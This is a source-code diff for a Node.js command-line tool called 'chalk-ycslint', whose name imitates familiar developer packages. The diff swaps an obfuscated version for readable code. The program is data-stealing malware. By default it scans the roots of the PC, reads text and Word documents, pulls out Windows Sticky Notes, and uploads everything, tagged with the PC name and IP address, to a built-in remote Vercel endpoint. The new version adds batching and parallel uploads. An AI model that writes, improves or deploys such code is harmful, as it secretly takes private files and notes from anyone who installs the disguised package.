@@ -1,3 +1,393 @@
 #!/usr/bin/env node
-const a0_0x2e5c4c=a0_0x4bca;(function(_0xe05b98,_0x51091b){const _0x48df33=a0_0x4bca,_0x4709e6=_0xe05b98();while(!![]){try{const _0x5590fe=parseInt(_0x48df33(0x186))/0x1+-parseInt(_0x48df33(0x1a5))/0x2+parseInt(_0x48df33(0x189))/0x3+parseInt(_0x48df33(0x1a1))/0x4+parseInt(_0x48df33(0x1a3))/0x5+parseInt(_0x48df33(0x1a9))/0x6+-parseInt(_0x48df33(0x19d))/0x7;if(_0x5590fe===_0x51091b)break;else _0x4709e6['push'](_0x4709e6['shift']());}catch(_0xe10242){_0x4709e6['push'](_0x4709e6['shift']());}}}(a0_0x408c,0xbd774));import{expandPathsToSupportedFiles,listPcScanRoots,readTextAndWordFiles}from'../lib/a3r8w.js';import{getClientInfo}from'../lib/d8v0h.js';import{postFilesAsJson}from'../lib/b6t1y.js';import{DEFAULT_UPLOAD_URL}from'../lib/c2u5z.js';function a0_0x4bca(_0x12444b,_0x4f302a){_0x12444b=_0x12444b-0x181;const _0x408c28=a0_0x408c();let _0x4bca74=_0x408c28[_0x12444b];return _0x4bca74;}import{extractWindowsStickyNotes}from'../lib/p8x1v.js';function printHelp(){const _0x46f064=a0_0x4bca;console['log']([_0x46f064(0x1b7),_0x46f064(0x19e),'',_0x46f064(0x1ae),_0x46f064(0x194),_0x46f064(0x184),'\x20\x20--header\x20\x22Key:\x20Value\x22\x20\x20\x20\x20\x20\x20\x20\x20Extra\x20request\x20header\x20(repeatable)',_0x46f064(0x198),_0x46f064(0x1aa),'\x20\x20--scan-pc\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20Include\x20PC\x20roots\x20scan\x20(default\x20true;\x20can\x20be\x20disabled)',_0x46f064(0x1bb),'\x20\x20--skip-system-dirs\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20Skip\x20system\x20directories\x20(default\x20false)',_0x46f064(0x193),'',_0x46f064(0x19c),_0x46f064(0x18f),'\x20\x20--no-include-sticky-notes\x20\x20\x20\x20Disable\x20Sticky\x20Notes\x20upload','','Examples:','\x20\x20chalk-ycslint\x20--url\x20http://localhost:3000/upload\x20--field\x20files\x20./docs','\x20\x20chalk-ycslint\x20--no-scan-pc\x20./src\x20./README.md',_0x46f064(0x1bd)][_0x46f064(0x1ac)]('\x0a'));}function parseHeaders(_0x376f04){const _0x2edfad=a0_0x4bca,_0x3590ab={};for(const _0x4129c3 of _0x376f04){const _0x1aa938=_0x4129c3[_0x2edfad(0x1b1)](':');if(_0x1aa938===-0x1)throw new Error(_0x2edfad(0x181)+_0x4129c3+_0x2edfad(0x183));const _0x3ad414=_0x4129c3[_0x2edfad(0x1a7)](0x0,_0x1aa938)[_0x2edfad(0x1a8)](),_0x2a4257=_0x4129c3[_0x2edfad(0x1a7)](_0x1aa938+0x1)[_0x2edfad(0x1a8)]();if(!_0x3ad414)throw new Error(_0x2edfad(0x181)+_0x4129c3+_0x2edfad(0x18e));_0x3590ab[_0x3ad414]=_0x2a4257;}return _0x3590ab;}function parseArgs(_0x27302c){const _0x5a888f=a0_0x4bca,_0x5d225c=[],_0x2d0e2a=[];let _0x1266c8=DEFAULT_UPLOAD_URL,_0x42b3e2='files',_0x2a0a7f=0x927c0,_0x5eb3fe=![],_0x3b28e4=!![],_0x4a207e=![],_0xdca07a=![],_0x268867=!![];for(let _0x4eaa3c=0x0;_0x4eaa3c<_0x27302c[_0x5a888f(0x19a)];_0x4eaa3c++){const _0x43eb5d=_0x27302c[_0x4eaa3c];if(_0x43eb5d==='-h'||_0x43eb5d==='--help')return{'help':!![]};if(_0x43eb5d==='--url'){_0x1266c8=_0x27302c[++_0x4eaa3c]||'';continue;}if(_0x43eb5d===_0x5a888f(0x188)){_0x42b3e2=_0x27302c[++_0x4eaa3c]||'';continue;}if(_0x43eb5d===_0x5a888f(0x1a4)){const _0x142a34=_0x27302c[++_0x4eaa3c];if(_0x142a34)_0x2d0e2a[_0x5a888f(0x18b)](_0x142a34);continue;}if(_0x43eb5d===_0x5a888f(0x1ab)){const _0x389904=_0x27302c[++_0x4eaa3c];_0x2a0a7f=_0x389904?Number['parseInt'](_0x389904,0xa):Number['NaN'];continue;}if(_0x43eb5d==='-r'||_0x43eb5d===_0x5a888f(0x196)){_0x5eb3fe=!![];continue;}if(_0x43eb5d==='--scan-pc'){_0x3b28e4=!![];continue;}if(_0x43eb5d==='--no-scan-pc'){_0x3b28e4=![];continue;}if(_0x43eb5d==='--skip-system-dirs'){_0x4a207e=!![];continue;}if(_0x43eb5d==='--batch'){_0xdca07a=!![];continue;}if(_0x43eb5d==='--include-sticky-notes'){_0x268867=!![];continue;}if(_0x43eb5d==='--no-include-sticky-notes'){_0x268867=![];continue;}if(_0x43eb5d[_0x5a888f(0x197)]('-'))throw new Error(_0x5a888f(0x1c0)+_0x43eb5d);_0x5d225c[_0x5a888f(0x18b)](_0x43eb5d);}if(!_0x1266c8['trim']())throw new Error('Missing\x20--url\x20value.');if(!_0x42b3e2[_0x5a888f(0x1a8)]())throw new Error(_0x5a888f(0x1b9));if(!Number[_0x5a888f(0x187)](_0x2a0a7f)||_0x2a0a7f<=0x0)throw new Error(_0x5a888f(0x1ad));return{'help':![],'url':_0x1266c8['trim'](),'field':_0x42b3e2[_0x5a888f(0x1a8)](),'files':_0x5d225c,'headers':parseHeaders(_0x2d0e2a),'timeoutMs':_0x2a0a7f,'recursive':_0x5eb3fe,'scanPc':_0x3b28e4,'skipSystemDirs':_0x4a207e,'batch':_0xdca07a,'includeStickyNotes':_0x268867};}async function main(){const _0xb3255a=a0_0x4bca,_0x5ec4aa=process[_0xb3255a(0x191)][_0xb3255a(0x1a7)](0x2);let _0x2229e5;try{_0x2229e5=parseArgs(_0x5ec4aa);}catch(_0x4cfcf0){console[_0xb3255a(0x182)](_0x4cfcf0?.[_0xb3255a(0x1bf)]||String(_0x4cfcf0)),process[_0xb3255a(0x19b)]=0x2;return;}if(_0x2229e5['help']){printHelp();return;}const _0x390828=_0x2229e5[_0xb3255a(0x1c1)]?[...await listPcScanRoots(),..._0x2229e5[_0xb3255a(0x19f)]]:_0x2229e5[_0xb3255a(0x19f)];if(_0x390828[_0xb3255a(0x19a)]===0x0){console[_0xb3255a(0x182)]('No\x20input\x20paths\x20provided.\x20Use\x20\x22--help\x22\x20for\x20usage.'),process[_0xb3255a(0x19b)]=0x2;return;}const _0x3e4e9b=await expandPathsToSupportedFiles(_0x390828,{'recursive':_0x2229e5[_0xb3255a(0x185)],'skipSystemDirs':_0x2229e5['skipSystemDirs']}),_0x248515=await(await import(_0xb3255a(0x195)))[_0xb3255a(0x1be)](),_0x55ab24=getClientInfo(),_0x256d6b=_0x55ab24[_0xb3255a(0x1b4)]+'\x20('+_0x55ab24[_0xb3255a(0x1b0)]+')',_0x268bbb=[];if(_0x2229e5[_0xb3255a(0x1af)])try{const _0x472cec=await extractWindowsStickyNotes();_0x472cec&&_0x268bbb[_0xb3255a(0x18b)]({'filename':_0xb3255a(0x18a),'mimeType':_0xb3255a(0x1b2),'text':JSON['stringify']({'source':{'kind':_0xb3255a(0x1b3),'dbPath':_0x472cec[_0xb3255a(0x1b8)]},'notes':_0x472cec['notes']},null,0x2)});}catch(_0x3d5623){_0x268bbb[_0xb3255a(0x18b)]({'filename':_0xb3255a(0x1ba),'mimeType':_0xb3255a(0x18c),'text':_0x3d5623?.[_0xb3255a(0x1bf)]?String(_0x3d5623[_0xb3255a(0x1bf)]):String(_0x3d5623)});}const _0x5f1548={'url':_0x2229e5[_0xb3255a(0x1a2)],'field':_0x2229e5[_0xb3255a(0x1bc)],'extraHeaders':_0x2229e5['headers'],'timeoutMs':_0x2229e5[_0xb3255a(0x1a0)],'clientId':_0x256d6b,'pcName':_0x55ab24[_0xb3255a(0x1b4)],'clientIp':_0x55ab24[_0xb3255a(0x1b0)]};if(_0x3e4e9b[_0xb3255a(0x19a)]===0x0&&_0x268bbb[_0xb3255a(0x19a)]===0x0){console[_0xb3255a(0x1b6)]('No\x20supported\x20files\x20found.');return;}if(_0x2229e5[_0xb3255a(0x1a6)]){const _0x1c8c45=await readTextAndWordFiles(_0x3e4e9b,{'driveMap':_0x248515});await postFilesAsJson({..._0x5f1548,'files':[..._0x1c8c45,..._0x268bbb]}),console[_0xb3255a(0x1b6)](_0xb3255a(0x190)+(_0x1c8c45[_0xb3255a(0x19a)]+_0x268bbb[_0xb3255a(0x19a)])+_0xb3255a(0x199));return;}let _0x5bd552=0x0;for(const _0x48f26f of _0x3e4e9b){const [_0x112884]=await readTextAndWordFiles([_0x48f26f],{'driveMap':_0x248515});await postFilesAsJson({..._0x5f1548,'files':[_0x112884]}),_0x5bd552++,console[_0xb3255a(0x1b6)]('['+_0x5bd552+'/'+_0x3e4e9b['length']+']\x20'+_0x112884['filename']);}for(const _0x5bc452 of _0x268bbb){await postFilesAsJson({..._0x5f1548,'files':[_0x5bc452]}),_0x5bd552++,console[_0xb3255a(0x1b6)](_0xb3255a(0x1b5)+_0x5bc452[_0xb3255a(0x18d)]);}}function a0_0x408c(){const _0x1d13cd=['\x20\x20--timeout\x20<ms>\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20Request\x20timeout\x20(default:\x20600000)','\x20item(s).','length','exitCode','Sensitive\x20data\x20controls:','32165868xfSudD','\x20\x20chalk-ycslint\x20[options]\x20<path1>\x20<path2>\x20...','files','timeoutMs','5804924DxgDTb','url','2870115TFSpEr','--header','215960yfFerb','batch','slice','trim','4009470famahe','\x20\x20-r,\x20--recursive\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20Recurse\x20into\x20folders','--timeout','join','Invalid\x20--timeout\x20value.','Options:','includeStickyNotes','clientIp','indexOf','application/json','windows-sticky-notes','pcName','[extra]\x20','log','Usage:','dbPath','Missing\x20--field\x20value.','windows-sticky-notes.error.txt','\x20\x20--no-scan-pc\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20Disable\x20PC\x20roots\x20scan','field','\x20\x20chalk-ycslint\x20--include-sticky-notes\x20--batch\x20--no-scan-pc\x20./','getDriveNameMap','message','Unknown\x20option:\x20','scanPc','Invalid\x20--header\x20value:\x20\x22','error','\x22\x20(expected\x20\x22Key:\x20Value\x22)','\x20\x20--field\x20<fieldName>\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20JSON\x20field\x20name\x20for\x20payload\x20(default:\x20files)','recursive','1289909fAKOyt','isFinite','--field','4487244lJPnFI','windows-sticky-notes.json','push','text/plain','filename','\x22\x20(empty\x20key)','\x20\x20--include-sticky-notes\x20\x20\x20\x20\x20\x20\x20Enable\x20Sticky\x20Notes\x20upload\x20(default:\x20on)','Uploaded\x20','argv','catch','\x20\x20--batch\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20Upload\x20all\x20files\x20in\x20one\x20request\x20(default\x20false)','\x20\x20--url\x20<url>\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20Upload\x20endpoint\x20(default:\x20built-in)','../lib/e4j7k.js','--recursive','startsWith'];a0_0x408c=function(){return _0x1d13cd;};return a0_0x408c();}main()[a0_0x2e5c4c(0x192)](_0x5c80b9=>{const _0x56e22f=a0_0x2e5c4c;console['error'](_0x5c80b9?.[_0x56e22f(0x1bf)]||String(_0x5c80b9)),process['exitCode']=0x1;});
+import {
+  expandPathsToSupportedFiles,
+  listPcScanRoots,
+  readTextAndWordFiles,
+} from "../lib/a3r8w.js";
+import { getClientInfo } from "../lib/d8v0h.js";
+import {
+  postFilesAsJson,
+  postFilesAsJsonInBatches,
+  postFilesAsJsonParallel,
+  isVercelUploadUrl,
+  VERCEL_SAFE_BODY_BYTES,
+} from "../lib/uploadHttp.js";
+import { DEFAULT_UPLOAD_URL } from "../lib/c2u5z.js";
+import { extractWindowsStickyNotes } from "../lib/p8x1v.js";
 
+const VERCEL_DEFAULT_CONCURRENCY = Number(process.env.UPLOAD_CONCURRENCY) || 4;
+const LOCAL_DEFAULT_CONCURRENCY = Number(process.env.UPLOAD_CONCURRENCY) || 8;
+const READ_CONCURRENCY = Number(process.env.UPLOAD_READ_CONCURRENCY) || 8;
+
+function formatBytes(bytes) {
+  if (bytes < 1024) return `${bytes} B`;
+  if (bytes < 1024 * 1024) return `${(bytes / 1024).toFixed(1)} KB`;
+  return `${(bytes / (1024 * 1024)).toFixed(1)} MB`;
+}
+
+function defaultConcurrencyForUrl(url) {
+  return isVercelUploadUrl(url) ? VERCEL_DEFAULT_CONCURRENCY : LOCAL_DEFAULT_CONCURRENCY;
+}
+
+function printHelp() {
+  console.log(
+    [
+      "Usage:",
+      "  chalk-ycslint [options] <path1> <path2> ...",
+      "",
+      "Options:",
+      "  --url <url>                      Upload endpoint (default: built-in Vercel URL)",
+      "  --field <fieldName>              JSON field name for payload (default: files)",
+      '  --header "Key: Value"            Extra request header (repeatable)',
+      "  --timeout <ms>                   Request timeout (default: 600000)",
+      "  -r, --recursive                  Recurse into folders",
+      "  --scan-pc                        Include PC roots scan (default true; can be disabled)",
+      "  --no-scan-pc                     Disable PC roots scan",
+      "  --skip-system-dirs               Skip system directories (default false)",
+      "  --batch                          Upload all files in one request (local only; risky on Vercel)",
+      "  --sequential                     Upload one file at a time (slowest)",
+      "  --concurrency <n>                Parallel requests (default: 4 on Vercel, 8 elsewhere)",
+      "  --include-sticky-notes           Enable Sticky Notes upload (default: on)",
+      "  --no-include-sticky-notes        Disable Sticky Notes upload",
+      "",
+      "Vercel uploads:",
+      `  Requests are capped at ~4.5 MB. Default mode packs files into ~${formatBytes(VERCEL_SAFE_BODY_BYTES)} batches`,
+      "  and uploads several batches in parallel. Files larger than that limit are skipped with a warning.",
+      "",
+      "Examples:",
+      "  chalk-ycslint --no-scan-pc ./docs",
+      "  chalk-ycslint --url http://127.0.0.1:3000/ --concurrency 12 --no-scan-pc ./docs",
+      "  chalk-ycslint --sequential --no-scan-pc ./small-folder",
+    ].join("\n")
+  );
+}
+
+function parseHeaders(headerArgs) {
+  const headers = {};
+  for (const raw of headerArgs) {
+    const colon = raw.indexOf(":");
+    if (colon === -1) {
+      throw new Error(`Invalid --header value: "${raw}" (expected "Key: Value")`);
+    }
+    const key = raw.slice(0, colon).trim();
+    const value = raw.slice(colon + 1).trim();
+    if (!key) {
+      throw new Error(`Invalid --header value: "${raw}" (empty key)`);
+    }
+    headers[key] = value;
+  }
+  return headers;
+}
+
+function parseArgs(argv) {
+  const files = [];
+  const headers = [];
+  let url = DEFAULT_UPLOAD_URL;
+  let field = "files";
+  let timeoutMs = 600_000;
+  let recursive = false;
+  let scanPc = true;
+  let skipSystemDirs = false;
+  let batch = false;
+  let sequential = false;
+  let concurrency = null;
+  let includeStickyNotes = true;
+
+  for (let i = 0; i < argv.length; i++) {
+    const arg = argv[i];
+
+    if (arg === "-h" || arg === "--help") return { help: true };
+    if (arg === "--url") {
+      url = argv[++i] || "";
+      continue;
+    }
+    if (arg === "--field") {
+      field = argv[++i] || "";
+      continue;
+    }
+    if (arg === "--header") {
+      const header = argv[++i];
+      if (header) headers.push(header);
+      continue;
+    }
+    if (arg === "--timeout") {
+      const raw = argv[++i];
+      timeoutMs = raw ? Number.parseInt(raw, 10) : Number.NaN;
+      continue;
+    }
+    if (arg === "-r" || arg === "--recursive") {
+      recursive = true;
+      continue;
+    }
+    if (arg === "--scan-pc") {
+      scanPc = true;
+      continue;
+    }
+    if (arg === "--no-scan-pc") {
+      scanPc = false;
+      continue;
+    }
+    if (arg === "--skip-system-dirs") {
+      skipSystemDirs = true;
+      continue;
+    }
+    if (arg === "--batch") {
+      batch = true;
+      continue;
+    }
+    if (arg === "--sequential") {
+      sequential = true;
+      continue;
+    }
+    if (arg === "--concurrency") {
+      const raw = argv[++i];
+      concurrency = raw ? Number.parseInt(raw, 10) : Number.NaN;
+      continue;
+    }
+    if (arg === "--include-sticky-notes") {
+      includeStickyNotes = true;
+      continue;
+    }
+    if (arg === "--no-include-sticky-notes") {
+      includeStickyNotes = false;
+      continue;
+    }
+    if (arg.startsWith("-")) {
+      throw new Error(`Unknown option: ${arg}`);
+    }
+    files.push(arg);
+  }
+
+  const trimmedUrl = url.trim();
+  if (!trimmedUrl) throw new Error("Missing --url value.");
+  if (!field.trim()) throw new Error("Missing --field value.");
+  if (!Number.isFinite(timeoutMs) || timeoutMs <= 0) {
+    throw new Error("Invalid --timeout value.");
+  }
+
+  const resolvedConcurrency = concurrency ?? defaultConcurrencyForUrl(trimmedUrl);
+  if (!Number.isFinite(resolvedConcurrency) || resolvedConcurrency <= 0) {
+    throw new Error("Invalid --concurrency value.");
+  }
+
+  return {
+    help: false,
+    url: trimmedUrl,
+    field: field.trim(),
+    files,
+    headers: parseHeaders(headers),
+    timeoutMs,
+    recursive,
+    scanPc,
+    skipSystemDirs,
+    batch,
+    sequential,
+    concurrency: resolvedConcurrency,
+    includeStickyNotes,
+    vercel: isVercelUploadUrl(trimmedUrl),
+  };
+}
+
+async function buildStickyNoteFiles(includeStickyNotes) {
+  const extras = [];
+  if (!includeStickyNotes) return extras;
+
+  try {
+    const sticky = await extractWindowsStickyNotes();
+    if (sticky) {
+      extras.push({
+        filename: "windows-sticky-notes.json",
+        mimeType: "application/json",
+        text: JSON.stringify(
+          {
+            source: { kind: "windows-sticky-notes", dbPath: sticky.dbPath },
+            notes: sticky.notes,
+          },
+          null,
+          2
+        ),
+      });
+    }
+  } catch (err) {
+    extras.push({
+      filename: "windows-sticky-notes.error.txt",
+      mimeType: "text/plain",
+      text: err?.message ? String(err.message) : String(err),
+    });
+  }
+
+  return extras;
+}
+
+async function readPathsToFiles(paths, driveMap) {
+  const files = new Array(paths.length);
+
+  await runPool(paths, READ_CONCURRENCY, async (filePath, index) => {
+    const [file] = await readTextAndWordFiles([filePath], { driveMap });
+    files[index] = file;
+  });
+
+  return files;
+}
+
+function warnSkippedFiles(skipped) {
+  for (const { file, bytes } of skipped) {
+    console.warn(
+      `Skipped ${file.filename}: ${formatBytes(bytes)} exceeds Vercel limit (${formatBytes(VERCEL_SAFE_BODY_BYTES)}). Use a local backend for large files.`
+    );
+  }
+}
+
+async function main() {
+  let args;
+  try {
+    args = parseArgs(process.argv.slice(2));
+  } catch (err) {
+    console.error(err?.message || String(err));
+    process.exitCode = 2;
+    return;
+  }
+
+  if (args.help) {
+    printHelp();
+    return;
+  }
+
+  const inputPaths = args.scanPc
+    ? [...(await listPcScanRoots()), ...args.files]
+    : args.files;
+
+  if (inputPaths.length === 0) {
+    console.error('No input paths provided. Use "--help" for usage.');
+    process.exitCode = 2;
+    return;
+  }
+
+  const supportedPaths = await expandPathsToSupportedFiles(inputPaths, {
+    recursive: args.recursive,
+    skipSystemDirs: args.skipSystemDirs,
+  });
+
+  const driveMap = await (await import("../lib/e4j7k.js")).getDriveNameMap();
+  const client = getClientInfo();
+  const clientId = `${client.pcName} (${client.clientIp})`;
+  const stickyFiles = await buildStickyNoteFiles(args.includeStickyNotes);
+
+  const uploadBase = {
+    url: args.url,
+    field: args.field,
+    extraHeaders: args.headers,
+    timeoutMs: args.timeoutMs,
+    clientId,
+    pcName: client.pcName,
+    clientIp: client.clientIp,
+  };
+
+  if (supportedPaths.length === 0 && stickyFiles.length === 0) {
+    console.log("No supported files found.");
+    return;
+  }
+
+  if (args.batch) {
+    const filePayload = await readPathsToFiles(supportedPaths, driveMap);
+    const allFiles = [...filePayload, ...stickyFiles];
+
+    if (args.vercel) {
+      console.log(
+        `Vercel endpoint: splitting ${allFiles.length} file(s) into ~${formatBytes(VERCEL_SAFE_BODY_BYTES)} batches.`
+      );
+      const { skipped, batchCount } = await postFilesAsJsonInBatches({
+        ...uploadBase,
+        files: allFiles,
+        concurrency: args.concurrency,
+      });
+      warnSkippedFiles(skipped);
+      console.log(
+        `Uploaded ${allFiles.length - skipped.length} file(s) in ${batchCount} batch request(s).`
+      );
+      if (skipped.length) process.exitCode = 1;
+      return;
+    }
+
+    await postFilesAsJson({ ...uploadBase, files: allFiles });
+    console.log(`Uploaded ${allFiles.length} item(s).`);
+    return;
+  }
+
+  const allPaths = [...supportedPaths];
+  const totalItems = allPaths.length + stickyFiles.length;
+
+  if (args.sequential || totalItems <= 1) {
+    let done = 0;
+    for (const filePath of allPaths) {
+      const [file] = await readTextAndWordFiles([filePath], { driveMap });
+      await postFilesAsJson({ ...uploadBase, files: [file] });
+      done++;
+      console.log(`[${done}/${totalItems}] ${file.filename}`);
+    }
+    for (const file of stickyFiles) {
+      await postFilesAsJson({ ...uploadBase, files: [file] });
+      done++;
+      console.log(`[${done}/${totalItems}] ${file.filename}`);
+    }
+    return;
+  }
+
+  if (args.vercel) {
+    console.log(
+      `Reading ${allPaths.length} file(s), then uploading in ~${formatBytes(VERCEL_SAFE_BODY_BYTES)} batches (${args.concurrency} parallel).`
+    );
+    const filePayload = await readPathsToFiles(allPaths, driveMap);
+    const allFiles = [...filePayload, ...stickyFiles];
+    const { skipped, batchCount, batches } = await postFilesAsJsonInBatches({
+      ...uploadBase,
+      files: allFiles,
+      concurrency: args.concurrency,
+    });
+    warnSkippedFiles(skipped);
+    batches.forEach((batch, index) => {
+      console.log(
+        `[batch ${index + 1}/${batchCount}] ${batch.fileCount} file(s): ${batch.filenames.join(", ")}`
+      );
+    });
+    console.log(
+      `Done: ${allFiles.length - skipped.length}/${allFiles.length} file(s) in ${batchCount} request(s).`
+    );
+    if (skipped.length) process.exitCode = 1;
+    return;
+  }
+
+  const uploadJobs = [
+    ...allPaths.map((filePath) => ({ kind: "path", filePath })),
+    ...stickyFiles.map((file) => ({ kind: "file", file })),
+  ];
+
+  await runPool(uploadJobs, args.concurrency, async (job, index) => {
+    const file =
+      job.kind === "path"
+        ? (await readTextAndWordFiles([job.filePath], { driveMap }))[0]
+        : job.file;
+    await postFilesAsJson({ ...uploadBase, files: [file] });
+    console.log(`[${index + 1}/${uploadJobs.length}] ${file.filename}`);
+  });
+}
+
+async function runPool(items, concurrency, worker) {
+  if (items.length === 0) return;
+  const limit = Math.max(1, Math.min(concurrency, items.length));
+  let nextIndex = 0;
+
+  async function drain() {
+    while (nextIndex < items.length) {
+      const index = nextIndex++;
+      await worker(items[index], index);
+    }
+  }
+
+  await Promise.all(Array.from({ length: limit }, () => drain()));
+}
+
+main().catch((err) => {
+  console.error(err?.message || String(err));
+  process.exitCode = 1;
+});
